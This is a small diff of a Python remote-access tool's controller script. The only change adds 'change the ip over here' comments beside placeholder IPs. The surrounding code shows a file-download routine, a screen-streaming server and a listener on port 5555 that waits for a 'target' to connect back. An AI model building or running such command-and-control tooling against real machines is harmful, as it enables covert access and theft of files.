@@ -37,7 +37,7 @@ def download_file(file_name):
     f.close()
 def stream():
     global server
-    server = StreamingServer('<your ip>', 8080)
+    server = StreamingServer('<your ip>', 8080) #change the ip over here
     server.start_server()
     reliable_send("stream")
 
@@ -125,7 +125,7 @@ print("""
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('<your ip>', 5555))
+sock.bind(('<your ip>', 5555)) #change the ip over here
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
